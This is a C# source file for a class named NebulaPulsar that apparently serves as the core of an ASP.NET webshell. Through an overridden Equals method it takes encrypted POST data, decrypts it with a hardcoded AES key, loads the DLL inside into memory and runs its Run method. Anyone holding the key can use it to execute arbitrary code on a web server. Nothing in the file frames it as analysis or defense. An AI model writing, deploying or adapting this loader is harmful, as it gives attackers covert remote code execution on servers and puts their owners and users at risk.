using System;
using System.Web;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

public class NebulaPulsar
{
    private static readonly string KEY = "NBPULSARDEADBEEF";

    public byte[] Crypt(byte[] abData, int nMode)
    {
        RijndaelManaged aes = new RijndaelManaged {
            Key = Encoding.UTF8.GetBytes(KEY),
            Mode = CipherMode.ECB,
            Padding = PaddingMode.PKCS7
        };
        
        ICryptoTransform transform = (nMode == 1) ? aes.CreateEncryptor() : aes.CreateDecryptor();

        return transform.TransformFinalBlock(abData, 0, abData.Length);
    }

    public override bool Equals(object obj)
    {
        HttpContext context = (HttpContext)obj;
        HttpResponse response = context.Response;

        try
        {
            byte[] abEncryptedData = (byte[])context.Items["rawPostData"];
            if (abEncryptedData == null || abEncryptedData.Length == 0)
            {
                response.Write("NBPULSAR_ERROR: Data stream is empty.");
                return true;
            }

            byte[] abRawPayload = Crypt(abEncryptedData, 2);
            byte[] nLenBytes = new byte[4];
            Buffer.BlockCopy(abRawPayload, 0, nLenBytes, 0, 4);
            if (BitConverter.IsLittleEndian)
                Array.Reverse(nLenBytes);

            int nDllLength = BitConverter.ToInt32(nLenBytes, 0);

            byte[] abDllBuffer = new byte[nDllLength];
            Buffer.BlockCopy(abRawPayload, 4, abDllBuffer, 0, nDllLength);

            Assembly asm = Assembly.Load(abDllBuffer);

            Type targetType = null;
            foreach (Type t in asm.GetTypes())
            {
                MethodInfo m = t.GetMethod("Run", new Type[] {});
                if (m != null)
                {
                    targetType = t;
                    break;
                }
            }

            if (targetType == null)
                targetType = asm.GetTypes()[0];

            object instance = Activator.CreateInstance(targetType);
            context.Items["payload"] = abRawPayload;
            context.Items["len"] = nDllLength;
            context.Items["driver"] = this;

            MethodInfo method = targetType.GetMethod("Run", new Type[] { });
            if (method != null)
                method.Invoke(instance, null);
            else
                response.Write("ERROR: Cannot find Run.");
        }
        catch (Exception ex)
        {
            response.Write("CORE_INTERNAL_ERROR: " + ex.Message);
        }

        return true;
    }
}